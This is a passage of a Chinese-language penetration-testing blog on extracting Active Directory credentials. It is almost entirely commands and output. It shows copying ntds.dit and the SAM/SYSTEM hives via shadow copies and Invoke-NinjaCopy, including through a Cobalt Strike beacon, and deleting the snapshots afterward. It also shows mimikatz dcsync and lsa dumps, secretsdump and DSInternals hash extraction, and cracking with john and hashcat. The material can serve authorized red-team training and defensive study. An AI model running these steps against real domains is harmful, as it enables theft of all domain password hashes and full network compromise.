+   <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">vssadmin list shadows</span><br></code></pre></td></tr></table></figure>
+
+<pre><code class="hljs"> 无法直接访问 \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12 中的文件可通过创建符号链接访问快照中的文件：
+</code></pre>
+   <figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">mklink /d c:<span class="hljs-string">\testvsc</span> <span class="hljs-string">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\</span><br></code></pre></td></tr></table></figure>
+
+<pre><code class="hljs"> 删除符号链接：  
+</code></pre>
+   <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">rd</span> c:\testvsc<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>复制ntds.dit</p>
+<p>如果不想使用个链接的方式，就可以使用这个方法 </p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit <span class="hljs-name">c</span>:\ntds3.dit<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>删除快照</p>
+</li>
+</ol>
+   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vssadmin <span class="hljs-keyword">delete</span> shadows <span class="hljs-regexp">/for=c: /</span>quiet<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="NinjaCopy"><a href="#NinjaCopy" class="headerlink" title="NinjaCopy"></a>NinjaCopy</h1><p>  使用 PowerShell 复制 NTDS.dit  &#x2F; Registry Hives，绕过 SACL&#x2F;  DACL &#x2F; File Locks  </p>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMaﬁa/PowerSploit/master/Exﬁltration/Invoke-</a>  <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">NinjaCopy.ps1</a>  </p>
+</blockquote>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">NinjaCopy</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">NinjaCopy</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Windows</span>\<span class="hljs-variable">System32</span>\<span class="hljs-variable">config</span>\<span class="hljs-variable">SAM</span> <span class="hljs-operator">-</span><span class="hljs-variable">LocalDestination</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">sam</span><span class="hljs-operator">.</span><span class="hljs-variable">hive</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">NinjaCopy</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Windows</span>\<span class="hljs-variable">System32</span>\<span class="hljs-variable">config</span>\<span class="hljs-variable">SYSTEM</span> <span class="hljs-operator">-</span><span class="hljs-variable">LocalDestination</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">system</span><span class="hljs-operator">.</span><span class="hljs-variable">hive</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">NinjaCopy</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="hljs-operator">-</span><span class="hljs-variable">LocalDestination</span> <span class="hljs-string">&quot;C:\Users\Administrator\Desktop\ntds.dit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121123126491.png" srcset="/img/loading.gif" lazyload alt="image-20240121123126491"></p>
+<p>cs内存加载</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">beacon&gt; powershell-<span class="hljs-keyword">import</span> C:\Users\MINGY\Desktop\Invoke-NinjaCopy.ps1<br>[*] Tasked beacon <span class="hljs-keyword">to</span> <span class="hljs-keyword">import</span>: C:\Users\MINGY\Desktop\Invoke-NinjaCopy.ps1<br>[+] host <span class="hljs-keyword">called</span> home, sent: <span class="hljs-number">206740</span> bytes<br><br>beacon&gt; powershell Invoke-NinjaCopy -<span class="hljs-type">Path</span> C:\Windows\System32\config\SAM -LocalDestination c:\sam.hive<br>[*] Tasked beacon <span class="hljs-keyword">to</span> run: Invoke-NinjaCopy -<span class="hljs-type">Path</span> C:\Windows\System32\config\SAM -LocalDestination c:\sam.hive<br>[+] host <span class="hljs-keyword">called</span> home, sent: <span class="hljs-number">493</span> bytes<br><br>beacon&gt; powershell Invoke-NinjaCopy -<span class="hljs-type">Path</span> C:\Windows\System32\config\<span class="hljs-keyword">SYSTEM</span> -LocalDestination c:\<span class="hljs-keyword">system</span>.hive<br>[*] Tasked beacon <span class="hljs-keyword">to</span> run: Invoke-NinjaCopy -<span class="hljs-type">Path</span> C:\Windows\System32\config\<span class="hljs-keyword">SYSTEM</span> -LocalDestination c:\<span class="hljs-keyword">system</span>.hive<br>[+] host <span class="hljs-keyword">called</span> home, sent: <span class="hljs-number">509</span> bytes<br><br>beacon&gt; powershell Invoke-NinjaCopy -<span class="hljs-type">Path</span> &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination C:\ntds.dit<br>[*] Tasked beacon <span class="hljs-keyword">to</span> run: Invoke-NinjaCopy -<span class="hljs-type">Path</span> &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination C:\ntds.dit<br>[+] host <span class="hljs-keyword">called</span> home, sent: <span class="hljs-number">481</span> bytes<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="解密得到hash"><a href="#解密得到hash" class="headerlink" title="解密得到hash"></a>解密得到hash</h1><h2 id="在线破解"><a href="#在线破解" class="headerlink" title="在线破解"></a>在线破解</h2><p>  在线破解，不用将域控上的ntds.dit文件下载下来，直接在已有的shell上破解。  </p>
+<p>  有一个Cobaltstrike弹回的beacon，就可以在beacon中直接利用mimikatz来破解，前提是要有管理员权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::dcsync /domain:mingy.com /all /csv<br></code></pre></td></tr></table></figure>
+
+<p>  查看单个用户的详细信息  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz lsadump::dcsync <span class="hljs-regexp">/domain:mingy.com /u</span>ser:krbtgt<br></code></pre></td></tr></table></figure>
+
+<p>  查看所有用户的详细信息  </p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz lsadump::lsa /inject<br></code></pre></td></tr></table></figure>
+
+<h2 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h2><p> 离线破解一般需要两步，首先就是将远端域控的ntds.dit下载到本地，然后再在本地进行破解。  ntds.dit文件一直在被windows系统使用，所以常规的复制下载方法是无法将文件下载到本地的。首先将域控的 NTDS.DIT 和 SYSTEM 文件下载到本地，然后在本地进行破解。</p>
+<h3 id="SecretsDump"><a href="#SecretsDump" class="headerlink" title="SecretsDump"></a>SecretsDump</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># sam<br>secretsdump.exe -sam sam.hiv -<span class="hljs-keyword">security</span> <span class="hljs-keyword">security</span>.hiv -<span class="hljs-keyword">system</span> sys.hiv <span class="hljs-keyword">LOCAL</span><br><br># ntds.dit<br>secretsdump.exe -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span>.hive -ntds ntds.dit <span class="hljs-keyword">LOCAL</span><br><br># kali中可以使用impacket-secretsdump命令<br>impacket-secretsdump -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span>.hive -ntds ntds.dit <span class="hljs-keyword">LOCAL</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121124727833.png" srcset="/img/loading.gif" lazyload alt="image-20240121124727833"></p>
+<h3 id="john-解密hash"><a href="#john-解密hash" class="headerlink" title="john 解密hash"></a>john 解密hash</h3><p>需要将hash放入1 文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">john 1 <span class="hljs-attribute">--format</span>=NT<br></code></pre></td></tr></table></figure>
+
+<p>NT代表NTML</p>
+<h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>  DSInternals PowerShell模块提供了构建在框架之上的易于使用的cmdlet。主要功能包括离线  ntds.dit文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。  </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 导入DSInternals模块</span><br><span class="hljs-built_in">Import-Module</span> DSInternals<br><br><span class="hljs-comment"># 获取System bootkey</span><br><span class="hljs-variable">$key</span> = <span class="hljs-built_in">Get-Bootkey</span> <span class="hljs-literal">-SystemHivePath</span> <span class="hljs-string">&#x27;C:\SYSTEM&#x27;</span><br><br><span class="hljs-comment"># 获取所有账户信息</span><br><span class="hljs-built_in">Get-ADDBAccount</span> <span class="hljs-literal">-All</span> <span class="hljs-literal">-DBPath</span> <span class="hljs-string">&#x27;C:\ntds.dit&#x27;</span> <span class="hljs-literal">-Bootkey</span> <span class="hljs-variable">$key</span><br></code></pre></td></tr></table></figure>
+
+<p>导出hashcat</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">$key</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Bootkey</span> <span class="hljs-operator">-</span><span class="hljs-variable">SystemHivePath</span> <span class="hljs-operator">&#x27;</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">&#x27;</span><br><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ADDBAccount</span> <span class="hljs-operator">-</span><span class="hljs-built_in">All</span> <span class="hljs-operator">-</span><span class="hljs-variable">DBPath</span> <span class="hljs-operator">&#x27;</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">ntds</span><span class="hljs-operator">.</span><span class="hljs-variable">dit</span><span class="hljs-operator">&#x27;</span> <span class="hljs-operator">-</span><span class="hljs-variable">BootKey</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Format</span><span class="hljs-operator">-</span><span class="hljs-variable">Custom</span> <span class="hljs-operator">-</span><span class="hljs-variable">View</span> <span class="hljs-variable">HashcatNT</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-built_in">File</span> <span class="hljs-variable">hashes</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
